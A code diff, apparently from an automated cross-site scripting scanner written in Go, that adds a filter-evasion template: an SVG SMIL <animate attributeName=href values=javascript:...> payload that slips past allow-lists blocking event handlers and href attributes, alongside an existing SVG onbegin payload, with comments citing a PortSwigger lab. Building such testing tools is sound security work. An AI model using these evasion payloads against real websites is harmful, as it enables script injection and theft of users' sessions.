@@ -129,6 +129,19 @@ func htmlTextEvasionTemplates(a ContextAnalysis, m string) []candTemplate {
 		evasionTpl(prefix+"<svg><animatetransform onbegin="+m+" attributeName=transform></svg>", "<>", 40,
 			prefixReason(prefix, "the allow-list admits only some SVG markup — here <svg> and <animatetransform>, while blocking <svg onload> and <animate> — and SMIL's begin event fires when the animation starts (default begin=\"0s\", i.e. immediately), so onbegin references the marker on load"),
 			"svg_smil_begin"),
+		// Measured on PortSwigger lab 11: every event handler and every anchor
+		// href attribute is rejected, but SMIL <animate attributeName=href> is
+		// admitted. The animation writes the javascript: URL into the anchor's
+		// href after parsing, so no href attribute and no on* attribute is ever
+		// sent; the click a victim performs on the link is what runs it. The
+		// marker appears twice on purpose: once as the code the URL will run,
+		// and once as the anchor's own text, because that text is the element
+		// the verifier's click activation targets (it clicks the smallest
+		// marker-carrying element, and a click on the text bubbles to the
+		// anchor whose default action follows the animated href).
+		evasionTplTrigger(prefix+"<svg><a><animate attributeName=href values=javascript:"+m+" /><text x=20 y=20>"+m+"</text></a></svg>", "<>", 38,
+			prefixReason(prefix, "the allow-list rejects every on* handler and every href attribute, but admits SMIL: <animate attributeName=href values=javascript:MARKER> writes the URL into the anchor's href after parsing, so the construct carries no href and no handler at all, and one click on the link runs it"),
+			"smil_href_animation", TriggerInteraction),
 	}
 }
 
